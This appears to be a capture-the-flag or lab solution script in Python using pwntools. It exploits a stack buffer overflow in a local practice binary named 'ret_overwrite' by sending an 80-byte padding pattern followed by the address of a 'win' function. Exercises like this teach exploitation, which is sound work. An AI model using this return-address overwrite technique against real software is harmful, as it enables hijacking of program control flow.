#!/usr/bin/python
from pwn import *
context.arch = "amd64"

e = ELF("./ret_overwrite")
p = process("./ret_overwrite")
p.sendline(cyclic(80, n=context.bytes) + p64(e.symbols["win"]))
print p.read()
